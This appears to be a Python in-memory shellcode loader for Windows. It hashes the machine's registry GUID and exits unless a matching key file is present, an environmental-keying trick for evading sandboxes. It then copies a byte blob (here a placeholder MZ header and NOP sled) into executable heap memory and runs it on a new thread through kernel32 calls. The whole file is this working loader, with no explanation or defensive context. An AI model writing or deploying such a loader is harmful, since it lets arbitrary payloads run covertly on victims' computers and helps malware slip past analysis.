
import ctypes, hashlib, os, sys, winreg
STAGE = bytes.fromhex('4d5a9000') + b'\x90' * 1024
def _guid():
    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Cryptography')
    v, _ = winreg.QueryValueEx(k, 'MachineGuid')
    return v
_token = hashlib.sha256(_guid().encode()).hexdigest()
_base_dir = os.path.dirname(os.path.abspath(__file__))
if not os.path.exists(os.path.join(_base_dir, _token)):
    sys.exit(0)
k32 = ctypes.windll.kernel32
heap = k32.HeapCreate(262144, 0, 0)
addr = k32.HeapAlloc(heap, 0, len(STAGE))
ctypes.windll.kernel32.RtlMoveMemory(addr, STAGE, len(STAGE))
tid = ctypes.c_ulong(0)
k32.CreateThread(None, 0, addr, None, 0, ctypes.byref(tid))
